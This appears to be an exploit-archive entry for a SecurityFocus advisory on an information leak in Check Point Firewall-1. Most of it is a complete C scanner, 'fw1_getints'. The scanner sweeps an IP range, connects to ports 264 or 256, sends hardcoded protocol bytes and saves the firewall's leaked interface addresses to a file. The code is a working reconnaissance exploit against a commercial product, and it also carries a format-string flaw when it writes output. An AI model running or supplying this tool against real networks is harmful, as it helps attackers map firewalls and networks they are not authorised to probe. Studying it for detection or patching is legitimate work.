source: http://www.securityfocus.com/bid/8524/info

An information leakage issue has been discovered in Check Point Firewall-1. Because of this, an attacker may gain sensitive information about network resources. 

/************************************************************************/
/* The syntax is:                                                       */
/*       fw1_getints (start IP address) (end IP address)                */
/*                                                                      */
/*  Author: Jim Becher -- jim@becher.net                                */
/************************************************************************/
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/nameser.h>
#include <sys/stat.h>
#include <strings.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>

#define BUFSIZE 64

void snatch(int sock, char *pass) {
 int i, z, sockfd, len, result, bytes;
 int octet=0;
 char temp1[]="\x30\x00\x00\x03";
 char temp2[]="\x02\x59\x05\x21";
 char temp3[]="\x00\x00\x00\x08";
 char command[256];
 char buffer[BUFSIZE]="";
 FILE *out;
 char outfile[21];
 sockfd=sock;

 result=send(sockfd,temp1,4,0);
 sleep(1);    /* Ugly... */

 result=send(sockfd,temp2,4,0);

 result=read(sockfd, buffer, BUFSIZE);

 result=send(sockfd,temp3,4,0);

 result=read(sockfd, buffer, BUFSIZE);

 sprintf(outfile, "ints.%s", pass);
 out = fopen(outfile, "w");
 fprintf(out, "ints:\n", 6);
 i=4;
 while (i<result) {
   for (z=1; z<5; z++) {
     if ( buffer[i] < 0 ) {
       octet=buffer[i]+256;
     }
     else {
       octet=buffer[i];
     }
     fprintf(out, "%d", octet);
     i++;
     if (z != 4) {
       fprintf(out, ".");
     }
   }
   fprintf(out, "\n");
 }
 fprintf(out, buffer, BUFSIZE);
 close(sockfd);
}

void main(int argc, char *argv[])
{
 int sock;
 struct in_addr addr;
 struct sockaddr_in sin;
 unsigned long start;
 unsigned long end;
 unsigned long counter;
 char buffer[1000];
 struct hostent *hp=NULL;
 unsigned long lAddr;
 char *p;
 char trash[16];

 if (argc!=3)
 {
  printf("\nusage : %s start-ip-address  end-ip-address\n\n",argv[0]);
  exit(0);
 }
 
 start=inet_addr(argv[1]);
 end=inet_addr(argv[2]);
 
 for (counter = ntohl(start); counter <= ntohl(end); counter++)
 {
  int jim=0, h=0;

  sock=socket(AF_INET, SOCK_STREAM, 0);
  if ((counter & 0xff) == 255) counter++;
  if ((counter & 0xff) == 0)   counter++;
 
  sin.sin_family=AF_INET;
  sin.sin_port=htons(264);
  sin.sin_addr.s_addr=htonl(counter);
  addr.s_addr=htonl(counter);
  bzero(&(sin.sin_zero), 8);
  fprintf(stdout, "Checking: %s\n", inet_ntoa(addr));
  p=inet_ntoa(addr);
  strcpy(trash, p);
  jim=connect(sock, (struct sockaddr*)&sin, sizeof(sin));
  if (jim==0) {
	fprintf(stdout, "Port 264 open on %s -- Checkpoint Firewall-1 v4.1 or later.\n",inet_ntoa(addr));
	snatch(sock, trash);
    } 
  else {
	fprintf(stdout, "Can not connect to %s on port 264\n\n", inet_ntoa(addr));
	sin.sin_port=htons(256);
	jim=0;
	jim=connect(sock, (struct sockaddr*)&sin, sizeof(sin));
	if (jim==0) {
		fprintf(stdout, "Port 256 open on %s -- Checkpoint Firewall-1 4.0 or earlier.\n",inet_ntoa(addr));
		snatch(sock, trash);
	}
	else {
		fprintf(stdout, "Can not connect to %s on port 256\n\n", inet_ntoa(addr));
	}
    }
  jim=0;
 }
}
